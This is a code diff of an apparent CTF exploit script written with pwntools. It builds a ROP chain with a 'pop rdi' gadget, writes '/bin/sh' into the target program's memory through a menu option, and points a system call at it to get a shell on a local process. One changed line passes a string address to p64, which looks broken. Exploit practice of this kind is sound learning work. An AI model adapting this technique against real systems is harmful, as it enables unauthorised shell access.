@@ -20,9 +20,11 @@ log.info('Get Addresses')
 #info("%#x system", elf.symbols.system)
 #system_address = p64(elf.symbols.system)
 
-execute_string = next(elf.search(b'date'))
-info("%#x execute string", execute_string)
-execute_string = p64(next(elf.search(b'date')))
+#execute_string = next(elf.search(b'date'))
+#info("%#x execute string", execute_string)
+#execute_string = p64(next(elf.search(b'date')))
+
+execute_string = p64('0x004040b0')
 
 #call_system = next(elf.search(asm('call system'), executable = True)))[0]
 #info("%#x execute string", execute_string)
@@ -36,6 +38,10 @@ POP_RDI = p64((rop.find_gadget(['pop rdi', 'ret']))[0])
 log.info('Create IO')
 #io = remote('', )
 io = process(executable)
+
+log.info('add /bin/sh to memory')
+io.sendlineafter('>>', 'hof')
+io.sendlineafter('name: ', '/bin/sh')
 
 log.info('Send Command flag')
 io.sendlineafter('>>', 'flag')
